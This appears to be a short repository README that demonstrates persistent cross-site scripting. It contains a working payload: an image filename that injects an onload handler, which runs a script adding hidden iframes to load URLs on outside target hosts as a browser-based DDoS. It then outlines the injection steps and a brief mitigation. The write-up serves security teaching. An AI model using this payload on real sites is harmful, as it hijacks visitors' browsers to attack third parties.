---

## ñ§ê Description

The code in this repository demonstrates a common security vulnerability known as persistent Cross-Site Scripting (XSS). By not properly validating or sanitizing user input, malicious code can be injected into a web page and executed by other users who view the affected page.

## ñ§ê Code Example

```html
<img src="/imagename.jpg" onload="ddos('http://www.target1.com/1.jpg', 'http://www.target2.com/1.jpg');">
function ddos(url1, url2) {
  $("body").append("<iframe id='ifri_1523' style='display:none;' src='" + url1 + "'></iframe>");
  $("body").append("<iframe id='ifri_1524' style='display:none;' src='" + url2 + "'></iframe>");
}
```
ñ§ê Methodologies and Tactics

The code leverages the onload event in an image tag to execute arbitrary JavaScript code once the image has finished loading. This code can be used to perform various malicious activities, such as launching a Distributed Denial of Service (DDoS) attack.

    Methodology: Persistent XSS attack
    Tactics: Utilizing insecure image tags, exploiting the lack of input validation and sanitization

ñ§ê Proof of Concept (PoC)

The following steps outline how the persistent XSS vulnerability can be exploited:

  Inject Malicious Code: An attacker can upload an image with a specially crafted name that includes JavaScript code. For example, setting the image name to innocent.jpg" 

    onload="ddos('http://www.target1.com/1.jpg', 'http://www.target2.com/1.jpg'); would generate the following HTML markup:

    <img src="/innocent.jpg" onload="ddos('http://www.target1.com/1.jpg', 'http://www.target2.com/1.jpg');">

  Execute Arbitrary Script: Utilizing the onload event, the arbitrary script will be executed once the image has finished loading. This JavaScript code will run inside the browser of anyone who views the affected profile.

    Potential Impact: The injected code can be used to perform various malicious activities, such as launching DDoS attacks, stealing user data, or redirecting users to phishing sites.
    
ñ§ê Mitigation

To prevent this vulnerability, proper input validation and sanitization should be implemented. Escaping special characters and using secure coding practices can help ensure that user input is handled safely.
